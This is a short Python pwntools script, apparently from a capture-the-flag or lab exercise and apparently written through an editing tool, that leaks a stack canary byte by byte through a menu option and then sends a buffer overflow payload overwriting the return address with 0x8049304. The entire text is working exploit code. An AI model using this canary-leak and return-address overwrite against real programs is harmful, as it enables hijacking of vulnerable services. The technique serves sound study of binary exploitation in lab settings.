canary = b""
for i in range(128, 132):
    p.recvuntil(b"> ")
    p.sendline(b"V")
    p.sendline(str(i).encode())
    line = p.recvline().strip()
    canary += p8(int(line.split(b": ")[1], 16))
print("canary =", canary.hex())

# [E] overflow: buffer ebp-0x44, canary offset 64, ret offset 72
payload = b"A" * 64 + canary + b"B" * 4 + p32(0x8049304)

p.recvuntil(b"> ")
p.sendline(b"E")
p.sendline(str(len(payload)).encode())
p.recvline()  # prompt
p.send(payload)

print(p.recvall(timeout=3).decode(errors="replace"))
end_of_edit

